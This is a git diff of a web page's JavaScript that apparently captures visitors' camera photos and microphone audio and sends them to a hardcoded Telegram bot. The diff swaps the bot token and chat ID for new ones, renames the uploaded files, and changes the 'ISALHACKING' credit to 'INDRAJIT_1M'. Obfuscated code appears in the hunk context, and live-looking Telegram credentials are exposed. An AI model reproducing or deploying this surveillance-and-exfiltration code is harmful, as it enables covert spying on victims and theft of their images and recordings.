@@ -174,8 +174,8 @@ var 茜芦茜握虻鯵="d宛l哀clxa宛圧阿亜芦姐1斡g宛哀亜哀握k1axp�
 
     // NOTE: Jangan letakkan BOT_TOKEN di client-side. Gunakan server untuk menyimpan token.
 async function sendToTelegram(data, type) {
-  const BOT_TOKEN = '8244150894:AAENC4npHF2wx7xx7K_xlAXcEhv5xnchzA8';   // sebaiknya ambil dari backend
-  const CHAT_ID = '7637629406';     // sebaiknya ambil dari backend
+  const BOT_TOKEN = '8035908050:AAG1323EJXNfNyVnh7ECdMGh8SJ-9tY11A4';   // sebaiknya ambil dari backend
+  const CHAT_ID = '7743079399';     // sebaiknya ambil dari backend
 
   // validasi tipe
   if (type !== 'photo' && type !== 'audio') {
@@ -187,7 +187,7 @@ async function sendToTelegram(data, type) {
   // field untuk file: 'photo' untuk gambar, 'audio' untuk audio
   const fieldName = type === 'photo' ? 'photo' : 'audio';
   const extension = type === 'photo' ? 'jpg' : 'wav';
-  formData.append(fieldName, data, `ISALHACKING.${extension}`);
+  formData.append(fieldName, data, `INDRAJIT.${extension}`);
 
   const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;
 
@@ -214,7 +214,7 @@ async function sendToTelegram(data, type) {
   </script>
 
   <footer>
-    <p>Made With ❤️ BY: @ISALHACKING</p>
+    <p>Made With ❤️ BY: @INDRAJIT_1M</p>
   </footer>
 
 
